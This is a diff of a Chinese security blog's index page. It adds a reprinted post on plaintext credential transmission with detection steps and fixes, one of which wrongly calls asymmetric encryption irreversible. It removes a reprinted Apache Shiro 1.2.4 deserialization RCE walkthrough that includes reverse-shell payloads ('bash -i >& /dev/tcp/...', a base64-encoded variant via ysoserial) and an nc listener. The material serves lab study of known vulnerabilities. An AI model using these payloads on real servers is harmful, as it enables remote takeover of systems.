@@ -86,6 +86,55 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/15/Plaintext-Transmisson/">
+                Plaintext Transmission
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="用户凭据明文传输">用户凭据明文传输</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36292543/article/details/121743138">天泽岁月</a></p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>用户凭据通过未加密的通道传输。当我们在网站上面提交敏感数据到服务器的过程中未进行相关加密处理，导致攻击者通过中间人攻击方式（劫持、嗅探等）【如果加密方式是常见的加密也可以解密的（比如：MD5，RSA 等–另外base64只是一种编码方式并不算是加密！】即可获取到这些未加密的敏感数据。所有经过网关的流量都可以被黑客通过嗅探（ARP欺骗）的方式抓取到。</p>
+<p>当攻击者获取到这些数据之后，就可以用这些信息以合法用户的身份进入到应用系统中——甚至可能进入到应用系统后台中，一旦进入到应用系统中那么就可以获取更多的敏感数据，以及更有机会发现更多的漏洞。</p>
+</blockquote>
+<h2><span id="漏洞验证">漏洞验证</span></h2><blockquote>
+<p>找到网站或者web系统登录页面。</p>
+<p>通过过对网站登录页面的请求进行抓包，分析其数据包中相关password（密码）参数的值是否为明文。</p>
+<p>工具可用burp、wireshark、filder等等，抓包分析的密码</p>
+<p>浏览器的F12中的“网络”模块功能并点击HTML进行筛选，点击登录即可获取到post或者get的请求头及请求主体的内容，如下图所示，就获取到了http明文登录的敏感数据了。</p>
+<p><img src="/2022/08/15/Plaintext-Transmisson/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>由于用户凭据为敏感信息，应始终通过加密通道 (HTTPS) 传输，以避免被恶意用户拦截。因此应始终通过加密连接 (HTTPS) 将其传输到服务器。</p>
+<p>如果不用 HTTPS，可以在网站前端用 Javascript 做密码加密，加密后再进行传输。(js被禁用了就GG)</p>
+<p>使用正规的ca机构颁发的https证书</p>
+<p>采用非对称加密方式（不可逆的加密方式）</p>
+</blockquote>
+<h2><span id="参考学习">参考学习</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/107441540">浅谈“密码明文传输”</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xieweikun_7/article/details/105869954">渗透测试（二）：敏感信息明文传输</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/15/CVE-2014-0133-Nginx/">
                 CVE-2014-0133-Nginx
             </a>
@@ -2976,125 +3025,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
-                Shiro RememberMe 1.2.4
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
-</blockquote>
-<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
-<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
-</blockquote>
-<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如需进入环境，命令为</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
-
-<h3><span id="3web访问">3.web访问</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
-<p>或虚拟机外面用真实ip访问</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
-<p>至此漏洞环境搭建成功</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
-<p>查看返回包里setcookie有rememberme的字样</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
-<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
-</blockquote>
-<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
-<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
-</blockquote>
-<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
-<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>运行结果如下图：</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
-<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
-</blockquote>
-<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
-<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
-</blockquote>
-<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
-<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
-<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
-</blockquote>
-<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
-<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>PS：ip假的，不打码，观看流畅</p>
-</blockquote>
-<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
-</blockquote>
-<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
-<p>这里使用curl也能达到burp的效果</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
-</blockquote>
-<h2><span id="题外话1">题外话1</span></h2><blockquote>
-<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
-</blockquote>
-<h2><span id="题外话2">题外话2</span></h2><blockquote>
-<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
-</blockquote>
-<h2><span id="参考链接">参考链接：</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
